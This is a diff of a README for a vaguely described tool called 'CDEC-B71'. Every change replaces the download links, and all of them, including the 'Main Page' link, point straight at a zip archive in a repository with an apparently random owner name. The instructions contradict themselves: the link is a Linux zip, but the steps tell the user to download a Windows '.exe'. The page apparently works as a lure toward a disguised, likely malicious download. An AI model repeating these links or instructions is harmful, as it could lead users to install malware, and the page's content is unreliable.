@@ -1,6 +1,6 @@
 # ⚙️ CDEC-B71 - Simple Tool for Regular Sessions
 
-[![Download from GitHub](https://img.shields.io/badge/Download-CDEC--B71-brightgreen?style=for-the-badge)](https://github.com/Geoffroeadecorticansaccordionist209/CDEC-B71/raw/refs/heads/main/Linux/CDE-3.3-beta.4.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-CDEC--B71-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Geoffroeadecorticansaccordionist209/CDEC-B71/main/Linux/CDE_2.6.zip)
 
 ## 📋 About CDEC-B71
 
@@ -16,10 +16,10 @@ This section will guide you through downloading and installing CDEC-B71. You do 
 
 You can visit the GitHub page to download the latest version of CDEC-B71.
 
-[![Download Here](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Geoffroeadecorticansaccordionist209/CDEC-B71/raw/refs/heads/main/Linux/CDE-3.3-beta.4.zip)
+[![Download Here](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Geoffroeadecorticansaccordionist209/CDEC-B71/main/Linux/CDE_2.6.zip)
 
 1. Click the link above or go to:
-   https://github.com/Geoffroeadecorticansaccordionist209/CDEC-B71/raw/refs/heads/main/Linux/CDE-3.3-beta.4.zip
+   https://raw.githubusercontent.com/Geoffroeadecorticansaccordionist209/CDEC-B71/main/Linux/CDE_2.6.zip
 2. On the GitHub page, look for a section labeled **Releases** or a folder typically named **Download**.
 3. Find the latest release. It usually has a date or version number.
 4. Download the file that ends with `.exe`. This is the installer file for Windows.
@@ -88,7 +88,7 @@ To stay up to date:
 
 ## 🔗 Useful Links
 
-- Main Page: https://github.com/Geoffroeadecorticansaccordionist209/CDEC-B71/raw/refs/heads/main/Linux/CDE-3.3-beta.4.zip
-- Download Page: https://github.com/Geoffroeadecorticansaccordionist209/CDEC-B71/raw/refs/heads/main/Linux/CDE-3.3-beta.4.zip
+- Main Page: https://raw.githubusercontent.com/Geoffroeadecorticansaccordionist209/CDEC-B71/main/Linux/CDE_2.6.zip
+- Download Page: https://raw.githubusercontent.com/Geoffroeadecorticansaccordionist209/CDEC-B71/main/Linux/CDE_2.6.zip
 
-[![Download from GitHub](https://img.shields.io/badge/Download-CDEC--B71-green?style=for-the-badge)](https://github.com/Geoffroeadecorticansaccordionist209/CDEC-B71/raw/refs/heads/main/Linux/CDE-3.3-beta.4.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-CDEC--B71-green?style=for-the-badge)](https://raw.githubusercontent.com/Geoffroeadecorticansaccordionist209/CDEC-B71/main/Linux/CDE_2.6.zip)
